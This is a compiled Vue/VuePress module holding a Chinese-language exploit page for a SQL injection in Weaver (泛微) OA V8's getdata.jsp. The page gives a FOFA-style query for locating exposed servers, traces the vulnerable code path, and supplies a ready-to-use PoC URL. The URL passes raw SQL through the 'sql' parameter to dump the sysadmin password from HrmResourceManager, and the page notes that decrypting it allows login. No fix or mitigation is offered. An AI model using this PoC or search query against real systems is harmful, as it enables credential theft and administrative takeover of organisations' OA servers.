import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as a,c as t,e as i}from"./app-58e4a7d6.js";const r={},s=i(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>泛微OA V8 存在SQL注入漏洞，攻击者可以通过漏洞获取管理员权限和服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>泛微OA V8
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>app=&quot;泛微-协同办公OA&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>在getdata.jsp中，直接将request对象交给</p><p><strong>weaver.hrm.common.AjaxManager.getData(HttpServletRequest, ServletContext) :</strong></p><p>方法处理</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091042978.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在getData方法中，判断请求里cmd参数是否为空，如果不为空，调用proc方法</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091043985.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>Proc方法4个参数，(“空字符串”,”cmd参数值”,request对象，serverContext对象)</p><p>在proc方法中，对cmd参数值进行判断，当cmd值等于getSelectAllId时，再从请求中获取sql和type两个参数值，并将参数传递进getSelectAllIds（sql,type）方法中</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091043319.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>根据以上代码流程，只要构造请求参数</p><p>?cmd= getSelectAllId&amp;sql=select password as id from userinfo;</p><p>即可完成对数据库操控</p><p>POC</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/js/hrm/getdata.jsp?cmd=getSelectAllId&amp;sql=select%20password%20as%20id%20from%20HrmResourceManager
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>查询HrmResourceManager表中的password字段，页面中返回了数据库第一条记录的值（sysadmin用户的password）</p><p><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091043694.png" alt="" loading="lazy">解密后即可登录系统</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202091044509.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,24),d=[s];function n(p,l){return a(),t("div",null,d)}const g=e(r,[["render",n],["__file","泛微OA getdata.jsp SQL注入漏洞.html.vue"]]);export{g as default};
